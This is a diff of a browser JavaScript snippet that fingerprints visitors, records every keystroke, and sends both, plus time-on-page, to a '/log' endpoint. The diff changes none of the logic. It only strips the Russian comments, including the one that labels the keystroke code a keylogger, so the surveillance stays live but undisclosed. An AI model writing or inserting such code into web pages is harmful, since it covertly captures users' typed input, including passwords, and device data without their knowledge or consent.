@@ -1,5 +1,4 @@
 (function() {
-  // Собираем базовую информацию
   const info = {
     userAgent: navigator.userAgent,
     language: navigator.language,
@@ -16,14 +15,12 @@
     } : {},
   };
 
-  // Отправляем информацию сразу после загрузки
   fetch('/log', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({type: 'info', data: info})
   });
 
-  // Отслеживаем нажатия клавиш (кейлоггер)
   let keys = '';
   document.addEventListener('keydown', (e) => {
     keys += e.key;
@@ -37,7 +34,6 @@
     }
   });
 
-  // Отправляем время нахождения на странице при уходе
   window.addEventListener('beforeunload', () => {
     const timeSpent = Date.now() - info.timing.navigationStart;
     navigator.sendBeacon('/log', JSON.stringify({
@@ -45,5 +41,4 @@
       milliseconds: timeSpent
     }));
   });
-
 })();
